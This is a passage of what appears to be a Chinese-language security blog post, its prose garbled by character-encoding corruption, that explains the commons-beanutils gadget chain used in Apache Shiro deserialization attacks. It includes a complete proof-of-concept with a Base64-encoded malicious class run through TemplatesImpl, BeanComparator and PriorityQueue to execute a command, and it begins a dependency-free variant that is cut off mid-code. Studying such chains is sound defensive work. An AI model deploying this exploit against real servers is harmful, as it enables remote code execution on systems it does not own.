class="line"></span><br><span class="line">public void setName(String name) &#123; </span><br><span class="line">this.name = name;</span><br><span class="line"></span><br><span class="line">&#125; &#125;</span><br></pre></td></tr></table></figure><p>å®ƒåŒ…å«ä¸€ä¸ªç§æœ‰å±æ€§nameï¼Œå’Œè¯»å–å’Œè®¾ç½®è¿™ä¸ªå±æ€§çš„ä¸¤ä¸ªæ–¹æ³•ï¼Œåˆç§°ä¸ºgetterå’Œsetterã€‚å…¶ä¸­ï¼Œgetter çš„æ–¹æ³•åä»¥getå¼€å¤´ï¼Œsetterçš„æ–¹æ³•åä»¥setå¼€å¤´ï¼Œå…¨åç¬¦åˆéª†é©¼å¼å‘½åæ³•ï¼ˆCamel-Caseï¼‰ã€‚</p><p>CBä¸­ æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•ï¼š PropertyUtils.getProperty ï¼Œæ‰“å°è®©æˆ‘ä»¬çœ‹çœ‹ä»€ä¹ˆæƒ…å†µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;  </span><br><span class="line">        Object name = PropertyUtils.getProperty(new Cat(), &quot;name&quot;);  </span><br><span class="line">        System.out.println(name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹æ¥è¿™ä¸ª getProperty ä¼šè°ƒç”¨æˆ‘ä»¬çš„ getteræ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯getNameï¼Œè·å¾—è¿”å›å€¼ï¼Œé™¤æ­¤ä¹‹å¤–ï¼ŒPropertyUtils.getProperty è¿˜æ”¯æŒ é€’å½’è·å–å±æ€§ï¼Œæ¯”å¦‚ aå¯¹è±¡ä¸­æœ‰å±æ€§bï¼Œbå¯¹è±¡æœ‰å±æ€§cï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ PropertyUtils.getProperty(a, â€œb.câ€); çš„æ–¹å¼è¿›è¡Œé€’å½’è·å–ã€‚é€šè¿‡è¿™ä¸ª æ–¹æ³•ï¼Œä½¿ç”¨è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è°ƒç”¨ä»»æ„å¯¹è±¡çš„getterï¼Œé€‚ç”¨äºåœ¨ä¸ç¡®å®šJavaBeanæ˜¯å“ªä¸ªç±»å¯¹è±¡æ—¶ä½¿ç”¨ã€‚</p><h2 id="getterçš„åˆ©ç”¨"><a href="#getterçš„åˆ©ç”¨" class="headerlink" title="getterçš„åˆ©ç”¨"></a>getterçš„åˆ©ç”¨</h2><p>åœ¨ commons-beanutilsåŒ…ä¸­å­˜ åœ¨ä¸€ä¸ªï¼š<code> org.apache.commons.beanutils.BeanComparator ã€‚</code></p><p>BeanComparatoræ˜¯CBæä¾›ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ª JAVAbean æ˜¯å¦ç›¸ç­‰çš„ç±»ï¼Œå…¶å®ç°äº†Comparator å’ŒSerializableæ¥å£ ï¼Œå’±ä»¬æ¥çœ‹çœ‹ä»–çš„compareæ¯”è¾ƒæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public int compare(T o1, T o2) &#123;  </span><br><span class="line">    if (this.property == null) &#123;  </span><br><span class="line">        return this.internalCompare(o1, o2);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            Object value1 = PropertyUtils.getProperty(o1, this.property);  </span><br><span class="line">            Object value2 = PropertyUtils.getProperty(o2, this.property);  </span><br><span class="line">            return this.internalCompare(value1, value2);  </span><br><span class="line">        &#125; catch (IllegalAccessException var5) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString());  </span><br><span class="line">        &#125; catch (InvocationTargetException var6) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString());  </span><br><span class="line">        &#125; catch (NoSuchMethodException var7) &#123;  </span><br><span class="line">            throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>compareæ–¹æ³• æ¥æ”¶ä¸¤ä¸ªå¯¹è±¡ï¼š</p><ol><li>å¦‚æœ è¿™é‡Œçš„ property ä¸ºç©ºï¼Œåˆ™ç›´æ¥æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡</li><li>å¦‚æœè¿™é‡Œçš„property ä¸ä¸ºç©ºï¼Œåˆ™è°ƒç”¨PropertyUtils.getPropertyï¼Œåˆ†åˆ«å–è¿™ä¸¤ä¸ªå¯¹è±¡çš„ propertyå±æ€§ï¼Œç„¶åå†æ¯”è¾ƒä»–ä»¬çš„å±æ€§å€¼ã€‚</li></ol><p>æˆ‘ä»¬çŸ¥é“ï¼ŒPropertyUtils.getProperty è¿™ä¸ªæ–¹æ³•ä¼šè‡ªåŠ¨è°ƒç”¨ Getter æ–¹æ³•ï¼Œè¿™ä¸ªç‚¹æ˜¯ä»»æ„ä»£ç æ‰§è¡Œçš„å…³é”®ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç æ‰§è¡Œå‘¢ï¼Ÿ å…¶å®æ˜¯æœ‰çš„</p><p>åœ¨ç¬¬ä¸€ç¯‡  <a href="https://snowlyzz.github.io/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">JAVAåŠ¨æ€åŠ è½½å­—èŠ‚ç  | Ku1s (snowlyzz.github.io)</a>, å…¶ä¸­åœ¨è·Ÿæºç çš„æ—¶å€™ï¼Œæœ‰è¿™ä¹ˆä¸€æ¡é“¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure><p>çœ‹åˆ° ç¬¬ä¸€ä¸ª getOutputPropertiesï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥åˆ©ç”¨ Getter è‡ªåŠ¨å»è°ƒç”¨å…¶ getOutputProperties()æ–¹æ³•å‘¢ï¼Ÿç„¶ååç»­å†è¿›è¡Œæ¶æ„å­—èŠ‚ç ã€‚</p><p>æ‰€ä»¥  PropertyUtils.getProperty( obj1, property ) è¿™æ®µä»£ç  ï¼Œobj1 æ˜¯ä¸€ä¸ª TemplatesImpl å¯¹è±¡ï¼Œè€Œ property çš„å€¼ä¸º outputPropertiesæ—¶ï¼Œåˆ™ä¼šè‡ªåŠ¨è°ƒç”¨ getter æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ TemplatesImpl#getOutputProperties() æ–¹æ³•ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚</p><h2 id="getterååºåˆ—åŒ–åˆ©ç”¨è¿æ„é€ "><a href="#getterååºåˆ—åŒ–åˆ©ç”¨è¿æ„é€ " class="headerlink" title="getterååºåˆ—åŒ–åˆ©ç”¨è¿æ„é€ "></a>getterååºåˆ—åŒ–åˆ©ç”¨è¿æ„é€ </h2><p>äº†è§£äº†å¤§æ¦‚åŸç†ï¼Œæ¥ä¸‹æ¥æ¥æ„é€ ä¸€ä¸‹ åˆ©ç”¨é“¾</p><p>è¿˜æ˜¯å…ˆæ„é€  TemplatesImplï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>ç„¶å åˆ°æˆ‘ä»¬çš„ BeanComparator.class  ,è¿›è¡Œå®ä¾‹åŒ–ã€‚å¦‚æœæˆ‘ä»¬é»˜è®¤ BeanComparator.class æ„é€ å‡½æ•°ä¸ºç©ºæ—¶ï¼Œé»˜è®¤çš„ property å°±ä¸ºç©º :</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/null.jpg"></p><p><code>final BeanComparator comparator = new BeanComparator();</code></p><p>ç„¶åç”¨è¿™ä¸ª comparatorå®ä¾‹åŒ–ä¼˜å…ˆé˜Ÿåˆ— PriorityQueue ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">final PriorityQueue queue = new PriorityQueue(2, comparator); </span><br><span class="line">// stub data for replacement later </span><br><span class="line">queue.add(1);</span><br><span class="line">queue.add(1);</span><br><span class="line"></span><br><span class="line">// comparator = BeanComparatorå¯¹è±¡</span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆè¦ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">priorityQueue.add(1);</span><br><span class="line">priorityQueue.add(2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ—¶ä¸ºäº†è¿›è¡Œ å†…éƒ¨çš„å †éœ€è¦è°ƒæ•´ï¼Œè¿›è¡Œå…ƒç´ çš„æ¯”è¾ƒçš„è¯ï¼Œè‚¯å®šå¾—è‡³å°‘ä¸¤ä¸ªå…ƒç´ æ‰å¯ä»¥ã€‚è¿™ä¸€ç‚¹ä¹Ÿåœ¨ååºåˆ—åŒ–é“¾çš„ä»£ç ä¸­å¾—åˆ°äº†ä½“ç°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void heapify() &#123;</span><br><span class="line">    for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ–æ—¶ä½¿ç”¨æ­£ç»å¯¹è±¡ï¼Œä¸” property ä¸ºç©ºï¼Œè¿™ä¸€ç³»åˆ—æ“ä½œæ˜¯ä¸ºäº†åˆå§‹åŒ–çš„æ—¶å€™ä¸è¦å‡ºé”™ã€‚ç„¶åï¼Œæˆ‘ä»¬ å†ç”¨åå°„å°† property çš„å€¼è®¾ç½®æˆæ¶æ„çš„ outputProperties ï¼Œå°†é˜Ÿåˆ—é‡Œçš„ä¸¤ä¸ª1æ›¿æ¢æˆæ¶æ„çš„ TemplateImpl å¯¹è±¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); </span><br><span class="line">setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);</span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">new PriorityQueue(2,comparator=BeanComparatorå¯¹è±¡)</span><br><span class="line">PriorityQueue#readObject() =&gt;</span><br><span class="line">heapify() =&gt;</span><br><span class="line">siftDown() = &gt;</span><br><span class="line">siftDownUsingComparator()=&gt;</span><br><span class="line">comparator.compare()</span><br><span class="line"></span><br><span class="line">BeanComparator#compare() =&gt;</span><br><span class="line">if (this.property == null) &#123;&#125;=&gt;</span><br><span class="line"></span><br><span class="line">Object value1 = PropertyUtils.getProperty(o1, this.property);</span><br><span class="line">Object value2 = PropertyUtils.getProperty(o2, this.property);</span><br><span class="line"></span><br><span class="line">TemplatesImpl#getOutputProperties()=&gt;</span><br><span class="line">/**/</span><br><span class="line">TemplatesImpl#defineClass()</span><br></pre></td></tr></table></figure><p>å®Œæ•´POCï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==&quot;);  </span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">        BeanComparator comparator = new BeanComparator();//ä½¿ property =null é¿å…å‡ºé”™  </span><br><span class="line">  </span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue(2,comparator);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        priorityQueue.add(1);  </span><br><span class="line">        //å°†æ²¡æ”¹çš„å€¼ æ”¹æˆæ¶æ„å€¼  </span><br><span class="line">        setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //æ”¹æˆoutputProperties,ä½¿è‡ªåŠ¨è°ƒç”¨getOutputProperties  </span><br><span class="line">        setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //è®©å…¶å»å¯¹æ¯”ï¼Œä¸”æ»¡è¶³ queue[right]) &gt; 0  </span><br><span class="line">        byte[] serialize = serialize(priorityQueue);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;  </span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(obj,value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oout = new ObjectOutputStream(baout))&#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨~~~<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/pc1.jpg"></p><h2 id="æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨"><a href="#æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨" class="headerlink" title="æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨"></a>æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨</h2><p>æˆ‘ä»¬ç”¨ä¸Šä¸€ä¸ªpoc å‘é€payload æ—¶ä¼šå‘ç°<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ud.jpg"></p><p><code>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]</code></p><p>ç®€å•æ¥è¯´å°±æ˜¯æ²¡æœ‰æ‰¾åˆ° org.apache.commons.collections.comparators.ComparableComparator ç±»ï¼Œä»åŒ…åå³å¯çœ‹å‡ºï¼Œè¿™ä¸ªç±»æ˜¯æ¥è‡ªäºcommons-collectionsã€‚</p><p>åœ¨å®é™…åœºæ™¯ä¸‹ï¼Œç›®æ ‡å¯èƒ½æ²¡æœ‰å®‰è£… commons-collectionsä¾èµ–ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼ŒComparableComparatorè¿™ä¸ªç±»æ˜¯ç”¨ä¸äº†çš„ï¼Œå› ä¸ºä»–ä¾èµ–äºCCï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšåˆšç”¨çš„é‚£ä¸ªPOCï¼Œé‚£ä¹ˆéš¾é“æ²¡æœ‰CCå°±ä¸èƒ½åˆ©ç”¨å—ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ª org.apache.commons.collections.comparators.ComparableComparator è¿™ä¸ªç±»åœ¨ å“ªé‡Œä½¿ç”¨äº†ï¼š</p><p>æœ‰ä¸¤å¤„ è°ƒç”¨äº†  ComparableComparator ï¼š</p><ol><li><p>ReverseComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/rev.jpg"></p></li><li><p>BeanComparator<br><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/bc.jpg"></p></li></ol><p>è¿™é‡Œ ä¸¤è€…åˆ©ç”¨ç‚¹éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œæ‰€ä»¥åªè®² BeanComparator ã€‚</p><p>åœ¨BeanComparator ç±»çš„æ„é€ å‡½æ•°å¤„ï¼Œå½“æ²¡æœ‰æ˜¾å¼ä¼ å…¥ Comparator çš„æƒ…å†µä¸‹ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ ComparableComparator ã€‚</p><p>æ—¢ç„¶æ­¤æ—¶ ComparableComparator ä¾èµ–äºCCï¼Œå¹¶ä¸”æˆ‘ä»¬ç”¨ä¸äº†äº†,æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»æ¥å¹³æ›¿æ‰ComparableComparatorï¼Œå®ƒæ»¡è¶³ä¸‹é¢è¿™å‡ ä¸ªæ¡ä»¶ï¼š</p><ol><li>å®ç° java.util.Comparator æ¥å£ </li><li>å®ç° java.io.Serializable æ¥å£ </li><li>Javaã€shiroæˆ–commons-beanutilsè‡ªå¸¦ï¼Œä¸”å…¼å®¹æ€§å¼º</li></ol><p>é€šè¿‡IDEAçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ª CaseInsensitiveComparator ï¼š</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/ks.png"></p><p>å…¶ä»£ç å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static final Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER  </span><br><span class="line">                                     = new CaseInsensitiveComparator();  </span><br><span class="line">private static class CaseInsensitiveComparator  </span><br><span class="line">        implements Comparator&lt;String&gt;, java.io.Serializable &#123;  </span><br><span class="line">    // use serialVersionUID from JDK 1.2.2 for interoperability  </span><br><span class="line">    private static final long serialVersionUID = 8575799808933029326L;  </span><br><span class="line">  </span><br><span class="line">    public int compare(String s1, String s2) &#123;  </span><br><span class="line">        int n1 = s1.length();  </span><br><span class="line">        int n2 = s2.length();  </span><br><span class="line">        int min = Math.min(n1, n2);  </span><br><span class="line">        for (int i = 0; i &lt; min; i++) &#123;  </span><br><span class="line">            char c1 = s1.charAt(i);  </span><br><span class="line">            char c2 = s2.charAt(i);  </span><br><span class="line">            if (c1 != c2) &#123;  </span><br><span class="line">                c1 = Character.toUpperCase(c1);  </span><br><span class="line">                c2 = Character.toUpperCase(c2);  </span><br><span class="line">                if (c1 != c2) &#123;  </span><br><span class="line">                    c1 = Character.toLowerCase(c1);  </span><br><span class="line">                    c2 = Character.toLowerCase(c2);  </span><br><span class="line">                    if (c1 != c2) &#123;  </span><br><span class="line">                        // No overflow because of numeric promotion  </span><br><span class="line">                        return c1 - c2;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return n1 - n2;  </span><br><span class="line">    &#125;</span><br><span class="line">    private Object readResolve() &#123; return CASE_INSENSITIVE_ORDER; &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç±»æ˜¯ java.lang.String ç±»ä¸‹çš„ç§æœ‰ç±»ï¼Œå®ç°äº† Comparator å’Œ Serializableï¼Œæ˜¯ä¸ªå¥½çš„æ›¿ä»£å“<br>æˆ‘ä»¬é€šè¿‡ String.CASE_INSENSITIVE_ORDER å³å¯æ‹¿åˆ°ä¸Šä¸‹æ–‡ä¸­çš„ CaseInsensitiveComparator å¯¹ è±¡ï¼Œç”¨å®ƒæ¥å®ä¾‹åŒ– BeanComparator ï¼š</p><p>æ„é€ é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] 